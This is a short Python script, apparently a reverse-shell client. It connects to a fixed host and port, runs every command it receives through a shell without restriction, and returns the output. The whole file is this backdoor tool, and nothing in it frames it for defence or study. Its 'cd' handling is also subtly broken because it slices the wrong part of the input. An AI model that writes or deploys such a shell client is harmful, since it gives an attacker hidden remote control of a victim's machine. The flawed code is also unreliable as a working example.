import socket
import os
import subprocess

PORT = 9999
IP = socket.gethostbyname(socket.gethostname())
ADDR = (IP, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

while True:
    data = client.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[:3].decode("utf-8"))
    if len(data) > 0:
        pipe = subprocess.PIPE
        cmd = subprocess.Popen(data[:].decode(
            "utf-8"), shell=True, stderr=pipe, stdin=pipe, stdout=pipe
        )
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        current_dir = os.getcwd() + "> "
        client.send(str.encode(output_str + current_dir))
        print(output_str)
